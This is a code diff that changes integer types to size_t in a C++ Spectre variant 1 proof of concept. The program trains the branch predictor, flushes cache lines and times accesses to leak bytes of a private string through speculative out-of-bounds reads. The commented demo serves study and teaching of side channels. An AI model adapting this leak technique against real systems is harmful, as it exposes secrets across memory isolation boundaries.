@@ -52,9 +52,9 @@ static void force_read(void *p) { (void)*(volatile char *)p; }
 
 // Returns the indices of the biggest and second-biggest values in the range.
 template <typename RangeT>
-static std::pair<int, int> top_two_indices(const RangeT &range) {
-  std::pair<int, int> result = {0, 0};  // first biggest, second biggest
-  for (int i = 0; i < range.size(); ++i) {
+static std::pair<size_t, size_t> top_two_indices(const RangeT &range) {
+  std::pair<size_t, size_t> result = {0, 0};  // first biggest, second biggest
+  for (size_t i = 0; i < range.size(); ++i) {
     if (range[i] > range[result.first]) {
       result.second = result.first;
       result.first = i;
@@ -73,7 +73,7 @@ static std::pair<int, int> top_two_indices(const RangeT &range) {
 // Instead, the leak is performed by accessing out-of-bounds during speculative
 // execution, bypassing the bounds check by training the branch predictor to
 // think that the value will be in-range.
-static char leak_byte(const char *data, int offset) {
+static char leak_byte(const char *data, size_t offset) {
   // Create an array spanning at least 256 different cache lines, with
   // different cache line available for each possible byte.
   // We can use this for a timing attack: if the CPU has loaded a given cache
@@ -120,18 +120,18 @@ static char leak_byte(const char *data, int offset) {
   // cache). In this demo, it is more convenient to store it on the heap:
   // it is the _only_) heap-allocated value in this program, and easily removed
   // from cache.
-  auto size_in_heap = new int(strlen(data));
+  auto size_in_heap = new size_t(strlen(data));
 
   std::array<int64_t, 256> latencies = {};
   std::array<int64_t, 256> sorted_latencies = {};
   std::array<int, 256> scores = {};
-  int best_val = 0, runner_up_val = 0;
+  size_t best_val = 0, runner_up_val = 0;
 
   for (int run = 0;; ++run) {
     // Flush out entries from the timing array. Now, if they are loaded during
     // speculative execution, that will warm the cache for that entry, which
     // can be detected later via timing analysis.
-    for (int i = 0; i < 256; ++i) _mm_clflush(&isolated_oracle[i]);
+    for (size_t i = 0; i < 256; ++i) _mm_clflush(&isolated_oracle[i]);
     // Clflush is not ordered with respect to reads, so it is necessary to place
     // the mfence instruction here so that the clflushes retire before the
     // force_read calls below.
@@ -148,7 +148,7 @@ static char leak_byte(const char *data, int offset) {
     // we want to leak via out-of-bounds speculative access.
     int safe_offset = run % strlen(data);
 
-    for (int i = 0; i < 10; ++i) {
+    for (size_t i = 0; i < 10; ++i) {
       // Remove from cache so that we block on loading it from memory,
       // triggering speculative execution.
       _mm_clflush(&*size_in_heap);
@@ -156,13 +156,13 @@ static char leak_byte(const char *data, int offset) {
       // Train the branch predictor: perform in-bounds accesses 9 times,
       // and then use the out-of-bounds offset we _actually_ care about on the
       // tenth time.
-      int local_offset = ((i + 1) % 10) ? safe_offset : offset;
+      size_t local_offset = ((i + 1) % 10) ? safe_offset : offset;
 
       if (local_offset < *size_in_heap) {
         // This branch was trained to always be taken during speculative
         // execution, so it's taken even on the tenth iteration, when the
         // condition is false!
-        force_read(&isolated_oracle[data[local_offset]]);
+        force_read(&isolated_oracle[(size_t) (data[local_offset])]);
       }
     }
 
@@ -175,7 +175,7 @@ static char leak_byte(const char *data, int offset) {
     // Note: if the character at safe_offset is the same as the character we
     // want to know at i, the data from this run will be useless, but later runs
     // will use a different safe_offset.
-    for (int i = 0; i < 256; ++i) {
+    for (size_t i = 0; i < 256; ++i) {
       // NOTE: a sufficiently smart compiler (or CPU) might pre-fetch the
       // cache lines, rendering them all equally fast. It may be necessary in
       // that case to try to confuse it by accessing the offsets in a
@@ -200,17 +200,17 @@ static char leak_byte(const char *data, int offset) {
     // using the safe_offset which should be a cache-hit.
     int64_t hitmiss_diff = median_latency - latencies[data[safe_offset]];
     int hitcount = 0;
-    for (int i = 0; i < 256; ++i) {
+    for (size_t i = 0; i < 256; ++i) {
       if (latencies[i] < median_latency - hitmiss_diff / 2 &&
-          i != data[safe_offset]) ++hitcount;
+          i != (size_t) (data[safe_offset])) ++hitcount;
     }
 
     // If there is not exactly one hit, we consider that sample invalid and
     // skip it.
     if (hitcount == 1) {
-      for (int i = 0; i < 256; ++i) {
+      for (size_t i = 0; i < 256; ++i) {
         if (latencies[i] < median_latency - hitmiss_diff / 2 &&
-            i != data[safe_offset]) ++scores[i];
+            i != (size_t) (data[safe_offset])) ++scores[i];
       }
     }
 
@@ -231,14 +231,14 @@ static char leak_byte(const char *data, int offset) {
     }
   }
   delete size_in_heap;
-  return best_val;
+  return (char) best_val;
 }
 
 int main(int argc, char** argv) {
   std::cout << "Leaking the string: ";
   std::cout.flush();
-  const int private_offset = private_data - public_data;
-  for (int i = 0; i < strlen(private_data); ++i) {
+  const size_t private_offset = private_data - public_data;
+  for (size_t i = 0; i < strlen(private_data); ++i) {
     // On at least some machines, this will print the i'th byte from
     // private_data, despite the only actually-executed memory accesses being
     // to valid bytes in public_data.
